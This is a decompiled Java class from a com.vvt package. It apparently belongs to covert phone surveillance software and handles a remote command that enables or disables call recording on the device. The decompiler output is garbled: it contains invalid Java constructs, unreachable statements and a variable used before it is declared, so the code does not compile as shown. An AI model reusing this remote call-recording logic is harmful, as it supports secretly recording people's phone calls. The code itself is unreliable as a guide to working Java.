package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.base.FeatureId;
import com.vvt.callmanager.ref.BugEngineException;
import com.vvt.configurationmanager.c;
import com.vvt.preference.FxPreferenceException;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefCallRecordingWatchFlag;
import com.vvt.preference.PrefEventsCapture;
import com.vvt.preference.b;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.output.RmtCtrlOutputEnableCallRecording;
import java.util.List;

public class f
{
  private static final boolean a = a.a;
  private static final boolean b = a.d;
  private static final boolean c = a.e;
  
  public RmtCtrlOutputEnableCallRecording a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramControlCommand.getData();
    localRmtCtrlOutputEnableCallRecording = new com/vvt/remotecontrol/output/RmtCtrlOutputEnableCallRecording;
    localRmtCtrlOutputEnableCallRecording.<init>();
    for (;;)
    {
      try
      {
        b localb = paramh.n;
        localObject2 = FxPreferenceType.EVENTS_CTRL;
        localObject2 = localb.a((FxPreferenceType)localObject2);
        localObject2 = (PrefEventsCapture)localObject2;
        localObject1 = (Integer)localObject1;
        int k = ((Integer)localObject1).intValue();
        if (k != i) {
          continue;
        }
        bool3 = a;
        if (bool3) {}
        localObject1 = FeatureId.CAPTURE_CALL_RECORDING;
        bool4 = true;
        ((PrefEventsCapture)localObject2).setCapture((FeatureId)localObject1, bool4);
        localb.b();
        localObject1 = i.b(paramh);
        localObject1 = ((c)localObject1).b();
        bool4 = true;
        i.p(paramh, (List)localObject1, bool4, (PrefEventsCapture)localObject2);
        localObject2 = FxPreferenceType.CALL_RECORDING_WATCH_FLAG;
        localObject2 = localb.a((FxPreferenceType)localObject2);
        localObject2 = (PrefCallRecordingWatchFlag)localObject2;
        j = ((PrefCallRecordingWatchFlag)localObject2).getCallRecWatchFlag();
        if (j <= 0) {
          continue;
        }
        j = i;
      }
      catch (FxPreferenceException localFxPreferenceException)
      {
        Object localObject2;
        boolean bool4;
        int j;
        bool3 = c;
        if (!bool3) {
          continue;
        }
        localRmtCtrlOutputEnableCallRecording.setSuccess(false);
        String str1 = localFxPreferenceException.toString();
        localRmtCtrlOutputEnableCallRecording.setMessage(str1);
        continue;
        boolean bool2 = false;
        str1 = null;
        continue;
        bool2 = true;
        localRmtCtrlOutputEnableCallRecording.setWarning(bool2);
        continue;
      }
      catch (BugEngineException localBugEngineException)
      {
        boolean bool3 = c;
        if (!bool3) {
          continue;
        }
        localRmtCtrlOutputEnableCallRecording.setSuccess(false);
        String str2 = localBugEngineException.toString();
        localRmtCtrlOutputEnableCallRecording.setMessage(str2);
        continue;
      }
      bool3 = a;
      if ((bool3) && (j == 0)) {
        continue;
      }
      j = 0;
      localObject2 = null;
      localRmtCtrlOutputEnableCallRecording.setWarning(false);
      j = 1;
      localRmtCtrlOutputEnableCallRecording.setSuccess(j);
      return localRmtCtrlOutputEnableCallRecording;
      bool3 = a;
      if (bool3) {}
      localObject1 = FeatureId.CAPTURE_CALL_RECORDING;
      bool4 = false;
      ((PrefEventsCapture)localObject2).setCapture((FeatureId)localObject1, false);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */